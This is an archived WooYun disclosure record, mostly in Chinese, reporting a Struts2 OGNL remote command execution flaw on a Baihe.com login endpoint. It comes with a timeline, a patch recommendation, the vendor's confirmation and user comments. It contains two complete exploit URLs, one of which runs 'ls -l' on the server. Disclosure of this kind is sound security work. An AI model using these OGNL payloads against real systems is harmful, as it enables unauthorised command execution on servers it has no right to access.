{"id": 12672, "wybug_id": "wooyun-2013-021392", "wybug_title": "百合网某系统远程命令执行", "wybug_corp": "百合网", "wybug_author": "leaf", "wybug_date": "2013-04-08 15:04", "wybug_open_date": "2013-05-23 15:05", "wybug_type": "系统/服务补丁不及时", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "补丁不及时", "远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-04-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-05-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-05-23：\t细节向公众公开  简要描述： 百合网某系统远程命令执行! 详细说明：  Struts2远程命令执行漏洞：\nhttp://coop.baihe.com/login.action\n简单测试下--输出\"wooyun\":\nhttp://coop.baihe.com/login.action?('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(d))&('\\u0023c')(('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(c))&(asdf)(('\\u0023rp\\u003d@org.apache.struts2.ServletActionContext@getResponse()')(c))&(fgd)(('\\u0023rp.getWriter().print(\"woo\")')(d))&(fgd)(('\\u0023rp.getWriter().print(\"yun\")')(d))&(grgr)(('\\u0023rp.getWriter().close()')(d))=1\n\n\n列出当前目录：\nhttp://coop.baihe.com/login.action?('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\\43mycmd\\75\\'ls\\40\\u002dl\\'')(d))&(h)(('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)')(d))&(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')(d))&(j)(('\\43myres\\75new\\40byte[51020]')(d))&(k)(('\\43mydat.readFully(\\43myres)')(d))&(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')(d))&(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\\43myout.getWriter().println(\\43mystr)')(d))\n\n\n.........and so on!!!   漏洞证明：  如上所述！   修复方案：  [1]下载最新的版本2.3.4：http://struts.apache.org/download.cgi#struts234[2]或者修改对应jar中的ongl处理逻辑,然后编译打包替换旧的文件。   版权声明：转载请注明来源 leaf@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-04-08 17:17 厂商回复： leaf还是很专业的，谢谢对我们的关注，我们会及时处理的。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-04-08 15:34 |    \t\t‫‌ \t\t\t( 实习白帽子  |\t\t\t        Rank:76 漏洞数:14        )\t\t \n  百合说这很简单的。    \n     2013-04-08 16:04 |    \t\tclzzy \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:18        )\t\t \n  怕死不革命，前排广告位招租！    \n     2013-04-08 16:05 |    \t\t小葵 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:9        | 我们是害虫，我们是害虫！)\t\t \n   = =   很简单。。。    \n     2013-04-08 16:10 |    \t\tcharles \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 研究web安全,0day,漏洞挖掘,关注国内安全动...)\t\t \n  前几天有个大学生说百合很安全.MD百合就这样还安全？    \n     2013-04-08 16:18 |    \t\tleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:948 漏洞数:121        | 真的没影响么？)\t\t \n  我中午看了“非你莫属”的那一期节目...    \n     2013-04-08 16:32 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  慕岩在节目里对那个人说的是“你没测出来么？其实还是有的”。。     \n     2013-04-08 16:39 |    \t\tleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:948 漏洞数:121        | 真的没影响么？)\t\t \n  @gainover 确实是这么个说法...    \n     2013-04-08 16:52 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @gainover 哈哈~慕岩的综合实力还是很高的额。他还真是啥都懂的~    \n     2013-04-08 16:56 |    \t\tleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:948 漏洞数:121        | 真的没影响么？)\t\t \n  慕岩...莫言 ...音好近...    \n     2013-04-08 17:21 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:125        | 如果大海能够带走我的矮丑...)\t\t \n  @leaf 跟柳岩近不近？大咪咪柳岩。。。？    \n     2013-04-08 18:50 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:30        | Hacked by @ringzero 我錯了)\t\t \n  这让8K的同学情何以堪    \n     2013-04-08 19:24 |    \t\tleaf \t\t\t( 普通白帽子  |\t\t\t        Rank:948 漏洞数:121        | 真的没影响么？)\t\t \n  @小胖子 汗！    \n     2013-04-09 09:31 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1425 漏洞数:165        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  看来乌云同学的身价都超过了8k    \n     2013-04-09 09:34 |    \t\t裙下的秘密 \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:9        | )\t\t \n  @小胖子 你还别说听到慕岩这个名字我想到的是柳岩 -。-    \n     2013-04-09 10:19 |    \t\tCroxy \t\t\t( 普通白帽子  |\t\t\t        Rank:513 漏洞数:52        | 只会送人头)\t\t \n  其实幕慕岩在乌云是有ID的•﹏•    \n     2013-04-09 11:46 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:125        | 如果大海能够带走我的矮丑...)\t\t \n  @裙下的秘密 我们俩都是真屌丝。。。    \n     2013-04-09 12:15 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1425 漏洞数:165        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  @Croxy 说不定他还是核心白帽子:)    \n     2013-04-09 13:18 |    \t\t裙下的秘密 \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:9        | )\t\t \n  @小胖子 估计是那，只有屌丝才能心意相通 -。-    \n     2013-04-09 15:10 |    \t\tnone \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 十次十次啊 hack it then know more~)\t\t \n  sangfor.....    \n     2013-05-08 17:54 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  顶慕岩    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}